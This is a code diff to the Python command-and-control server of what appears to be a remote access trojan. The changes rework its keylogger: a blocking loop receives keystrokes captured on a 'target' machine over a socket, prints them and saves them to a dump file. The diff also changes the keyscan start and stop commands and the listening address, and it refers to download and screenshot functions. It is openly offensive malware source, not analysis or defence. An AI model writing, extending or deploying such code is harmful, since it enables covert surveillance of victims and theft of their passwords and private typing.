@@ -5,9 +5,9 @@
 # of various commands and file operations.
 
 import socket
-import threading
 import os
 import json
+import time
 from datetime import datetime
 
 
@@ -18,10 +18,10 @@ class Server:
         self.base_filename = None
         self.log_filename = None
         self.screenshot_filename = None
-        self.stop_logging = 0
         self.dump_logging = ""
         self.server_socket = None
         self.target_socket = None
+        self.active_once = True
 
     def dump_log_file(self):
         count = 1
@@ -33,14 +33,16 @@ class Server:
         with open(self.log_filename, "a") as log:
             log.write(self.dump_logging)
 
-    def thread_logger(self):
-        if self.stop_logging == 0:
-            while True:
+    def key_logger(self):
+        self.dump_logging = ""
+        while True:
+            try:
                 R_OUTPUT = self.target_socket.recv(1024).decode()
                 print(R_OUTPUT, end='')
                 self.dump_logging += R_OUTPUT
-        else:
-            return
+            except KeyboardInterrupt:
+                self.dump_log_file()
+                break
 
     def send_data_as_json(self, data):
         json_data = json.dumps(data)
@@ -154,6 +156,9 @@ class Server:
                     """)
                 continue
 
+            elif command.startswith('keyscan_stop'):  # just to be safe
+                continue
+
             self.send_data_as_json(command)
 
             if command.lower() == 'quit':
@@ -169,17 +174,13 @@ class Server:
                 os.system(clear_command)
                 continue
 
-            elif command.startswith('keyscan_start'):
+            elif command.startswith('keyscan start'):
                 print("[+] Keylogger started.")
-                thread_Log = threading.Thread(target=self.thread_logger)
-                thread_Log.start()
-                continue
-
-            elif command.startswith('keyscan_stop'):
-                self.dump_log_file()
-                self.stop_logging = 1
-                print("[-] Keylogger stopped.")
-                print("[+] keylog saved to Dump file")
+                print("[!] ctrl+C to save & stop")
+                self.key_logger()
+                print("[!] Log saved! ")
+                time.sleep(1.25)
+                self.send_data_as_json('keyscan_stop')
                 continue
 
             elif command.startswith('download'):
@@ -203,5 +204,5 @@ class Server:
 
 
 if __name__ == "__main__":
-    server = Server('192.168.1.231', 5555)  # enter ip and port
+    server = Server('192.168.0.0', 5555)  # enter ip and port
     server.main()
